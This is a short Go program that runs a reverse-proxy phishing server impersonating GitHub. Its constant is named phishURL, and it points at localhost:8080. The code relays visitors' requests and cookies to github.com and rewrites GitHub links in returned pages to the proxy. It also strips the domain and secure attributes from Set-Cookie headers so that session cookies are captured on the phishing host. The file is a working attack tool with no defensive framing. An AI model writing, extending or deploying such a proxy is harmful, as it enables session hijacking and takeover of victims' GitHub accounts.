package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
)

const (
	upstreamURL = "https://github.com"
	phishURL    = "http://localhost:8080"
)

func replaceURLInResp(body []byte, header http.Header) []byte {
	// detect is html or not
	contentType := header.Get("Content-Type")
	isHTML := strings.Contains(contentType, "text/html")

	// if NOT, return same body
	if !isHTML {
		return body
	}

	bodyStr := string(body)
	bodyStr = strings.Replace(bodyStr, upstreamURL, phishURL, -1)

	phishGitURL := fmt.Sprintf(`%s(.*)\.git`, phishURL)
	upstreamGitURL := fmt.Sprintf(`%s$1.git`, upstreamURL)
	re, err := regexp.Compile(phishGitURL)
	if err != nil {
		panic(err)
	}
	bodyStr = re.ReplaceAllString(bodyStr, upstreamGitURL)

	return []byte(bodyStr)
}

func cloneRequest(r *http.Request) *http.Request {
	method := r.Method
	body := r.Body

	path := r.URL.Path
	rawQuery := r.URL.RawQuery
	url := "https://github.com" + path + "?" + rawQuery

	req, err := http.NewRequest(method, url, body)
	if err != nil {
		panic(err)
	}

	req.Header["Cookie"] = r.Header["Cookie"]

	return req
}

func sendReqToUpstream(req *http.Request) ([]byte, http.Header) {
	client := http.Client{}

	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	resp.Body.Close()

	return respBody, resp.Header
}

func handler(w http.ResponseWriter, r *http.Request) {
	req := cloneRequest(r)

	body, header := sendReqToUpstream(req)
	body = replaceURLInResp(body, header)

	for _, v := range header["Set-Cookie"] {
		newValue := strings.Replace(v, "domain=.github.com;", "", -1)
		newValue = strings.Replace(newValue, "secure;", "", 1)

		w.Header().Add("Set-Cookie", newValue)
	}

	w.Write(body)
}

func main() {
	http.HandleFunc("/", handler)
	err := http.ListenAndServe(":8080", nil)
	if err != nil {
		panic(err)
	}
}
